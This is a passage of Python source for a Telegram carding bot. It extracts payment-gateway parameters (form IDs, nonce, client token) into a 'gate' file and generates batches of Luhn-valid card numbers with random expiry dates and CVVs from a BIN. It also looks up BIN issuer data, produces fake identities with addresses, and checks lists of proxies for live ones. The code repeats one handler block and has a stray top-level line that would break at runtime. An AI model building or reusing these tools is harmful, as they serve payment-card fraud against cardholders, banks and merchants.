    file_name = f'@B11HB_{massege.from_user.id}.py'
    with open(file_name, "w", encoding="utf-8") as f:
    	f.write(text_content)
    with open(file_name, "rb") as f:
        bot.send_document(
        chat_id=massege.chat.id,
        document=f,
        caption=f'''The gate was successfully withdrawn ✅
━━━━━━━━━━━━━━━━━━━━
<strong>Gatet information ...</strong>

[<a href="https://t.me/B">ϟ</a>] Link: <code>{link}</code>
[<a href="https://t.me/B">ϟ</a>] id form: <code>{id_form1}</code>
[<a href="https://t.me/B">ϟ</a>] id form2: <code>{id_form2}</code>
[<a href="https://t.me/B">ϟ</a>] nonce: <code>{nonec}</code>
[<a href="https://t.me/B">ϟ</a>] client token: <code>{au}</code>
[<a href="https://t.me/B">ϟ</a>] id payment: <code>{tok}</code>
[<a href="https://t.me/B">ϟ</a>] msg gatet: <code>{msg}</code>
━━━━━━━━━━━━━━━━━━━━
Dev: @B11HB''',
        parse_mode="HTML"
    )













@bot.message_handler(func=lambda message: message.text.lower().startswith('.bin') or message.text.lower().startswith('/bin'))
def resgpond_to_vhk(message):
	with open("blockusers.txt", "r") as file:
		blocked = file.read().splitlines()
	if str(message.from_user.id) in blocked:
		bot.send_message(message.chat.id, 'The admin has blocked you due to your negative behavior. ')
		return 
	cc = message.text.replace('.bin ', '').replace('/bin ', '')
	bot.reply_to(message,f'''<b>	
𝐕𝐚𝐥𝐢𝐝 𝐁𝐈𝐍 ✅	
ϟ - BIN -></b> <code>{cc}</code>
<b>{str(dato(cc[:6]))}</b>''')										
												

def generate_credit_card(message, bot, ko):
    try:
        # البحث عن رقم البطاقة والبيانات الأخرى في الرسالة
        match = re.search(r'(\d{6,16})\D*(\d{1,2}|xx)?\D*(\d{2,4}|xx)?\D*(\d{3,4}|xxx)?', message.text)
        if match:
            card_number = match.group(1)
            
            # التحقق من صحة BIN
            if len(card_number) < 6 or card_number[0] not in ['4', '5', '3', '6']:
                bot.edit_message_text(chat_id=message.chat.id, message_id=ko, text='''<b>BIN not recognized. Please enter a valid BIN ❌</b>''', parse_mode="HTML")
                return

            bin = card_number[:6]
            response_message = ""

            # توليد 10 بطاقات ائتمان
            for _ in range(10):
                month = int(match.group(2)) if match.group(2) and match.group(2) != 'xx' else random.randint(1, 12)
                year = int(match.group(3)) if match.group(3) and match.group(3) != 'xx' else random.randint(2025, 2029)

                # تحديد طول الـ CVV بناءً على نوع البطاقة
                if card_number[:1] == "3":
                    cvv = int(match.group(4)) if match.group(4) and match.group(4) != 'xxx' else random.randint(1000, 9999)
                else:
                    cvv = int(match.group(4)) if match.group(4) and match.group(4) != 'xxx' else random.randint(100, 999)

                # توليد بطاقة ائتمان مع الشهر، السنة، والـ CVV
                credit_card_info = generate_credit_card_info(card_number, month, year, cvv)
                response_message += f"<code>{credit_card_info}</code>\n"

            # جلب معلومات الـ BIN
            try:
                data = requests.get(f'https://bins.antipublic.cc/bins/{bin}').json()
                brand = data.get('brand', 'Unknown')
                card_type = data.get('type', 'Unknown')
                country = data.get('country_name', 'Unknown')
                country_flag = data.get('country_flag', 'Unknown')
                bank = data.get('bank', 'Unknown')
            except:
                brand = 'Unknown'
                card_type = 'Unknown'
                country = 'Unknown'
                country_flag = 'Unknown'
                bank = 'Unknown'

            # إرسال النتيجة إلى المستخدم
            bot.edit_message_text(chat_id=message.chat.id, message_id=ko, text=f"𝐁𝐈𝐍 ➜  {bin}\n\n{response_message}\n𝐁𝐈𝐍 𝐈𝐧𝐟𝐨 ➜ {brand} - {card_type}\n𝐁𝐚𝐧𝐤 ➜  {bank}\n𝐂𝐨𝐮𝐧𝐭𝐫𝐲 ➜ {country} - {country_flag}", parse_mode="HTML")
        else:
            # في حالة الإدخال غير الصحيح
            bot.edit_message_text(chat_id=message.chat.id, message_id=ko, text='''<b>Invalid input. Please provide a BIN (Bank Identification Number) that is at least 6 digits but not exceeding 16 digits. 
Example: <code>/gen 412236xxxx |xx|2023|xxx</code></b>''', parse_mode="HTML")
    
    except IndexError:
        # معالجة الخطأ إذا كانت القائمة فارغة أو بها مشكلة
        bot.edit_message_text(chat_id=message.chat.id, message_id=ko, text="<b>BIN not recognized. Please enter a valid BIN ❌</b>")
    
    except Exception as e:
        # معالجة أي أخطاء غير متوقعة
        bot.edit_message_text(chat_id=message.chat.id, message_id=ko, text=f"An error occurred: {str(e)}")

def generate_credit_card_info(card_number, expiry_month, expiry_year, cvv):
    generated_num = str(card_number)
    if card_number[:1] == "5" or card_number[:1] == "4" or card_number[:1] == "6":
        while len(generated_num) < 15:
            generated_num += str(random.randint(0, 9))
        check_digit = generate_check_digit(generated_num)
        credit_card_number = generated_num + str(check_digit)
        return f"{credit_card_number}|{str(expiry_month).zfill(2)}|{str(expiry_year)[-2:]}|{cvv}"
    elif card_number[:1] == "3":
        while len(generated_num) < 14:
            generated_num += str(random.randint(0, 9))
        check_digit = generate_check_digit(generated_num)
        credit_card_number = generated_num + str(check_digit)
        return f"{credit_card_number}|{str(expiry_month).zfill(2)}|{str(expiry_year)[-2:]}|{cvv}"

def generate_check_digit(num):
    num_list = [int(x) for x in num]
    for i in range(len(num_list) - 1, -1, -2):
        num_list[i] *= 2
        if num_list[i] > 9:
            num_list[i] -= 9
    return (10 - sum(num_list) % 10) % 10

def luhn_checksum(card_number):
    digits = [int(x) for x in card_number]
    odd_digits = digits[-1::-2]
    even_digits = digits[-2::-2]
    checksum = sum(odd_digits)
    for digit in even_digits:
        checksum += sum(divmod(digit * 2, 10))
    return checksum % 10

@bot.message_handler(func=lambda message: message.text.lower().startswith('.gen') or message.text.lower().startswith('/gen'))
def respond_to_vbv(message):
	with open("blockusers.txt", "r") as file:
		blocked = file.read().splitlines()
	if str(message.from_user.id) in blocked:
		bot.send_message(message.chat.id, 'The admin has blocked you due to your negative behavior. ')
		return
	try:
		id=message.chat.id
		member = bot.get_chat_member(user_canal, id)
		if member.status == 'left':
			markup = types.InlineKeyboardMarkup()
			btn = types.InlineKeyboardButton('Channel The Bot', url='t.me/arr_cr')
			markup.add(btn)
			bot.send_message(id, text="Join the channel to continue.", reply_markup=markup)
			return
	except Exception as e:
		bot.send_message(message.chat.id, f"Error checking channel membership:\n{e}")
	ko = (bot.reply_to(message, "<b>Generating cards...⌛</b>",parse_mode="HTML").message_id)
	generate_credit_card(message,bot,ko)
            # طلب معلومات الـ BIN من API
data = requests.get(f'https://bins.antipublic.cc/bins/{bin}').json()																																																				
				
@bot.message_handler(func=lambda message: message.text.lower().startswith('.fake') or message.text.lower().startswith('/fake'))
def respond_to_vbv(message):
	def my_function():
		with open("blockusers.txt", "r") as file:
			blocked = file.read().splitlines()
		if str(message.from_user.id) in blocked:
			bot.send_message(message.chat.id, 'The admin has blocked you due to your negative behavior. ')
			return 
		try:
			id=message.chat.id
			member = bot.get_chat_member(user_canal, id)
			if member.status == 'left':
				markup = types.InlineKeyboardMarkup()
				btn = types.InlineKeyboardButton('Channel The Bot', url='t.me/arr_cr')
				markup.add(btn)
				bot.send_message(id, text="Join the channel to continue.", reply_markup=markup)
				return
		except Exception as e:
			bot.send_message(message.chat.id, f"Error checking channel membership:\n{e}")
		try:
			try:
				u=message.text.split('fake ')[1]
			except:
				u='US'
			parsed_data = requests.get(f'https://randomuser.me/api/?nat={u}').json()
			results = parsed_data['results']
			result = results[0]
			name = f"{result['name']['title']} {result['name']['first']} {result['name']['last']}"
			street_number = result['location']['street']['number']
			street_name = result['location']['street']['name']
			city = result['location']['city']
			state = result['location']['state']
			country = result['location']['country']
			postcode = result['location']['postcode']
			fake = Faker()
			phone = fake.phone_number()
			email = fake.email()
			formatted_address = f"""{country} Address Generator

[<a href="https://t.me/l">ϟ</a>] 𝗙𝘂𝗹𝗹 𝗡𝗮𝗺𝗲: <code>{name}</code>
[<a href="https://t.me/l">ϟ</a>] 𝗖𝗶𝘁𝗶𝘆 𝗧𝗼𝘄𝗻 𝗩𝗶𝗹𝗹𝗮𝗴𝗲: <code>{city}</code>
[<a href="https://t.me/l">ϟ</a>] 𝗦𝘁𝗮𝘁𝗲/𝗣𝗿𝗼𝘃𝗶𝗻𝗰𝗲/𝗥𝗲𝗴𝗶𝗼𝗻: <code>{state}</code>
[<a href="https://t.me/l">ϟ</a>] 𝗣𝗼𝘀𝘁𝗮𝗹 𝗖𝗼𝗱𝗲: <code>{postcode}</code>
[<a href="https://t.me/l">ϟ</a>] 𝗦𝘁𝗿𝗲𝗲𝘁 𝗔𝗱𝗱𝗿𝗲𝘀𝘀:  <code>{street_number} {street_name}</code>
[<a href="https://t.me/l">ϟ</a>] 𝗣𝗵𝗼𝗻𝗲 𝗡𝘂𝗺𝗯𝗲𝗿: <code>{phone}</code>
[<a href="https://t.me/l">ϟ</a>] 𝗖𝗼𝘂𝗻𝘁𝗿𝘆: <code>{country}</code>
[<a href="https://t.me/l">ϟ</a>] 𝗧𝗲𝗺𝗽𝗼𝗿𝗮𝗿𝘆 𝗘𝗺𝗮𝗶𝗹: <code>{email}</code>
			"""
			bot.reply_to(message, formatted_address,parse_mode="HTML")
		except:
			bot.reply_to(message, "Country code not found or not available.")
	my_thread = threading.Thread(target=my_function)
	my_thread.start()
def gen(bin):
	remaining_digits = 16 - len(bin)
	card_number = bin + ''.join([str(random.randint(0, 9)) for _ in range(remaining_digits - 1)])
	digits = [int(digit) for digit in card_number]
	for i in range(len(digits)):
		if i % 2 == 0:
			digits[i] *= 2
			if digits[i] > 9:
				digits[i] -= 9
	
	checksum = sum(digits)
	checksum %= 10
	checksum = 10 - checksum
	if checksum == 10:
		checksum = 0
	card_number += str(checksum)
	return card_number
@bot.message_handler(commands=["oq"])
def start(message):
 id=message.from_user.id
 tm=''
 if admin == (id):
  pass
 else:
  return
 me = 0
 msg=message.text.split('/oq')[1]
 try:
  with open('data.json') as f:
   data = json.load(f)
  bot.reply_to(message, 'Broadcasting...')
  for key, value in data.items():
   if key in tm:
    continue
   try:
    tm+=key+'\n'
    bot.send_message(key, msg)
    time.sleep(0.5)
    me+=1
   except Exception as e:
    print('ERROR : ',e)
  bot.reply_to(message, f'The message has been successfully sent to {me} user ✅')
 except Exception as e:
  bot.reply_to(message, 'Failed, something is wrong...❌')
  print('ERROR 2: ',e)


@bot.message_handler(commands=['block'])
def block_bin(message):
    BLOCKLIST_FILE = 'blockbin.txt'
    if str(message.from_user.id) not in admins:
        bot.reply_to(message, "You do not have permission to use this command.")
        return


    try:
        bin_to_block = message.text.split()[1]
        if not re.fullmatch(r"\d{6}", bin_to_block):
            bot.reply_to(message, "Please enter a valid 6-digit BIN. Example: /block 421689")
            return
    except IndexError:
        bot.reply_to(message, "Please enter a BIN to block. Example: /block 421689")
        return

    with open(BLOCKLIST_FILE, 'a') as file:
        file.write(f"{bin_to_block}\n")

    bot.reply_to(message, f"BIN {bin_to_block} has been added to the blocklist.")


@bot.message_handler(commands=['unblock'])
def unblock_bin(message):
    BLOCKLIST_FILE = 'blockbin.txt'
    if str(message.from_user.id) not in admins:
        bot.reply_to(message, "You do not have permission to use this command.")
        return


    try:
        bin_to_unblock = message.text.split()[1]
        if not re.fullmatch(r"\d{6}", bin_to_unblock):
            bot.reply_to(message, "Please enter a valid 6-digit BIN. Example: /unblock 421689")
            return
    except IndexError:
        bot.reply_to(message, "Please enter a BIN to unblock. Example: /unblock 421689")
        return

    try:
        with open(BLOCKLIST_FILE, 'r') as file:
            lines = file.readlines()

        with open(BLOCKLIST_FILE, 'w') as file:
            removed = False
            for line in lines:
                if line.strip() != bin_to_unblock:
                    file.write(line)
                else:
                    removed = True

        if removed:
            bot.reply_to(message, f"BIN {bin_to_unblock} has been removed from the blocklist.")
        else:
            bot.reply_to(message, f"BIN {bin_to_unblock} was not found in the blocklist.")

    except FileNotFoundError:
        bot.reply_to(message, "The blocklist file does not exist.")
        
        
        
        

@bot.message_handler(commands=['block2'])
def block_user(message):
    BLOCKLIST_FILE = 'blockusers.txt'
    if str(message.from_user.id) not in admins:
        bot.reply_to(message, "You do not have permission to use this command.")
        return

    try:
        user_id_to_block = message.text.split()[1]
        if not user_id_to_block.isdigit():
            bot.reply_to(message, "Please enter a valid numeric User ID. Example: /block2 123456789")
            return
    except IndexError:
        bot.reply_to(message, "Please enter a User ID to block. Example: /block2 123456789")
        return

    with open(BLOCKLIST_FILE, 'a') as file:
        file.write(f"{user_id_to_block}\n")

    bot.reply_to(message, f"User ID {user_id_to_block} has been added to the blocklist.")



@bot.message_handler(commands=['unblock2'])
def unblock_user(message):
    BLOCKLIST_FILE = 'blockusers.txt'
    if str(message.from_user.id) not in admins:
        bot.reply_to(message, "You do not have permission to use this command.")
        return

    try:
        user_id_to_unblock = message.text.split()[1]
        if not user_id_to_unblock.isdigit():
            bot.reply_to(message, "Please enter a valid numeric User ID. Example: /unblock2 123456789")
            return
    except IndexError:
        bot.reply_to(message, "Please enter a User ID to unblock. Example: /unblock2 123456789")
        return

    try:
        with open(BLOCKLIST_FILE, 'r') as file:
            lines = file.readlines()

        with open(BLOCKLIST_FILE, 'w') as file:
            removed = False
            for line in lines:
                if line.strip() != user_id_to_unblock:
                    file.write(line)
                else:
                    removed = True

        if removed:
            bot.reply_to(message, f"User ID {user_id_to_unblock} has been removed from the blocklist.")
        else:
            bot.reply_to(message, f"User ID {user_id_to_unblock} was not found in the blocklist.")

    except FileNotFoundError:
        bot.reply_to(message, "The blocklist file does not exist.")
        
        
        
        
        
        







@bot.message_handler(commands=['proxi'])
def admin_menu(message):
    	alyy = types.InlineKeyboardMarkup(row_width=1)
    	art = types.InlineKeyboardButton("Manual Check", callback_data= 'iiuuiio')
    	alyy.add(art)
    	Yrr = '[<a href="https://t.me/l">ϟ</a>] Welcome to the proxy checker interface'
    	video_url = 'https://t.me/C0CCOCOvjk/4' 
    	bot.send_video(message.chat.id, video_url, caption=Yrr,parse_mode='HTML', reply_markup=alyy)





@bot.callback_query_handler(func=lambda call: call.data.startswith('iiuuiio'))
def upload_gate_file(call):
    bot.send_message(call.message.chat.id, f"Send /proxy And Proxies")
    
@bot.message_handler(func=lambda m: m.text and (m.text.lower().startswith('.proxy') or m.text.lower().startswith('/proxy')))
def ali_al2(message):
    msg = bot.reply_to(message, "Checking Proxies ⏳ ...")
    parts = message.text.split(maxsplit=1)
    if len(parts) != 2:
        bot.edit_message_text(
            chat_id=message.chat.id,
            message_id=msg.message_id,
            text="Send proxies like:\n<code>/proxy ip:port ip:port:user:pass</code>",
            parse_mode="HTML"
        )
        return

    proxies_list = parts[1].split()














@bot.message_handler(commands=['proxi'])
def admin_menu(message):
    	alyy = types.InlineKeyboardMarkup(row_width=1)
    	art = types.InlineKeyboardButton("Manual Check", callback_data= 'iiuuiio')
    	alyy.add(art)
    	Yrr = '[<a href="https://t.me/l">ϟ</a>] Welcome to the proxy checker interface'
    	video_url = 'https://t.me/C0CCOCOvjk/4' 
    	bot.send_video(message.chat.id, video_url, caption=Yrr,parse_mode='HTML', reply_markup=alyy)





@bot.callback_query_handler(func=lambda call: call.data.startswith('iiuuiio'))
def upload_gate_file(call):
    bot.send_message(call.message.chat.id, f"Send /proxy And Proxies")
    
@bot.message_handler(func=lambda m: m.text and (m.text.lower().startswith('.proxy') or m.text.lower().startswith('/proxy')))
def ali_al2(message):
    msg = bot.reply_to(message, "Checking Proxies ⏳ ...")
    parts = message.text.split(maxsplit=1)
    if len(parts) != 2:
        bot.edit_message_text(
            chat_id=message.chat.id,
            message_id=msg.message_id,
            text="Send proxies like:\n<code>/proxy ip:port ip:port:user:pass</code>",
            parse_mode="HTML"
        )
        return

    proxies_list = parts[1].split()

    total = len(proxies_list)
    checked = 0
    live = 0
    dead = 0

    live_proxies = []

    lock = threading.Lock()

    def update_msg():
        bot.edit_message_text(
            chat_id=message.chat.id,
            message_id=msg.message_id,
            text=f"""
Proxy Checker Running 🔎

Proxy: {proxy}
Total: {total}
Checked: {checked}
Live: {live} ✅
Dead: {dead} ❌
"""
        )

    def check_proxy(proxy):
        nonlocal checked, live, dead

        try:
            p = proxy.split(":")
            if len(p) == 2:
                ip, port = p
                proxy_format = f"http://{ip}:{port}"
            elif len(p) == 4:
                ip, port, user, password = p
                proxy_format = f"http://{user}:{password}@{ip}:{port}"
            else:
                with lock:
                    checked += 1
                    dead += 1
                return

            headers = {"user-agent": generate_user_agent()}
            proxies = {"http": proxy_format, "https": proxy_format}

            r = requests.get(
                "https://httpbin.org/ip",
                headers=headers,
                proxies=proxies,
                timeout=8
            )

            if r.status_code == 200:

                with lock:
                    live += 1
                    checked += 1
                    live_proxies.append(proxy)

                bot.send_message(
                    message.chat.id,
                    f"LIVE PROXY ✅\n<code>{proxy}</code>",
                    parse_mode="HTML"
                )

            else:
                with lock:
                    checked += 1
                    dead += 1

        except:
            with lock:
                checked += 1
                dead += 1

        if checked % 5 == 0:
            update_msg()

    threads = []

    for proxy in proxies_list:
        t = threading.Thread(target=check_proxy, args=(proxy,))
        t.start()
        threads.append(t)

    for t in threads:
        t.join()

    update_msg()

    text_content = "\n".join(live_proxies)

    file_name = f'@wafa4048_{message.from_user.id}.txt'

    with open(file_name, "w", encoding="utf-8") as f:
        f.write(text_content)

    with open(file_name, "rb") as f:
        bot.send_document(
            chat_id=message.chat.id,
            document=f,
            caption=f'''The proxies were successfully checked ✅
━━━━━━━━━━━━━━━━━━━━
<strong>Proxies information ...</strong>

[<a href="https://t.me/B">ϟ</a>] Total: <code>{total}</code>
[<a href="https://t.me/B">ϟ</a>] Live: <code>{live}</code>
[<a href="https://t.me/B">ϟ</a>] Dead: <code>{dead}</code>
━━━━━━━━━━━━━━━━━━━━
Dev: @B11HB''',
            parse_mode="HTML"
        )
        
        
        
        
        
        
        
        
        
@bot.message_handler(commands=['admin'])
def admin_menu(message):
    id = message.chat.id
    if id == admin:
    	alyy = types.InlineKeyboardMarkup(row_width=1)
    	art = types.InlineKeyboardButton("Order", callback_data= 'oorrtt2')
    	alyy.add(art)
    	Yrr = '[<a href="https://t.me/l">ϟ</a>] Welcome, Admin, To The Command Panel.'
    	video_url = 'https://t.me/+xxbDXfpnF0kyODBk' 
    	bot.send_video(message.chat.id, video_url, caption=Yrr,parse_mode='HTML', reply_markup=alyy)
    else:
    	bot.send_message(message.chat.id,'You Not Admin ')
    	

@bot.callback_query_handler(func=lambda call: call.data == 'oorrtt2')
def oorrte(call):
	mmrk = types.InlineKeyboardMarkup(row_width=1)
	hhgg= types.InlineKeyboardButton("Back", callback_data= 'start3107')
	mmrk.add(hhgg)
	YTT222 = '''This Is My Admin Cmds.

Massege All ✅ >> /oq
Block Bin ✅ >> /block
Unblock Bin ✅ >> /unblock
Block ID ✅ >> /block2
Unblock ID ✅ >> /unblock2
'''
	bot.edit_message_caption(chat_id=call.message.chat.id, message_id=call.message.message_id, caption=YTT222,parse_mode='HTML', reply_markup=mmrk)


@bot.callback_query_handler(func=lambda call: call.data == "start3107")
def admin_menuij(call):
    id = call.message.chat.id
    if id == admin:
    	alyy = types.InlineKeyboardMarkup(row_width=1)
    	art = types.InlineKeyboardButton("Order", callback_data= 'oorrtt2')
    	alyy.add(art)
    	Yrr = '[<a href="https://t.me/l">ϟ</a>] Welcome, Admin, To The Command Panel.'
    	bot.edit_message_caption(chat_id=call.message.chat.id, message_id=call.message.message_id, caption=Yrr, parse_mode='HTML', reply_markup=alyy)
    else:
    	bot.send_message(call.message.chat.id,'You Not Admin ')


@bot.callback_query_handler(func=lambda call: call.data == 'stop')
def menu_callback(call):
	id=call.from_user.id
	stopuser[f'{id}']['status'] = 'stop'
print('- Bot was run ..')
while True:
    try:
        bot.infinity_polling(none_stop=True)
    except Exception as e:
        print(f'- Was error : {e}')
        time.sleep(5)
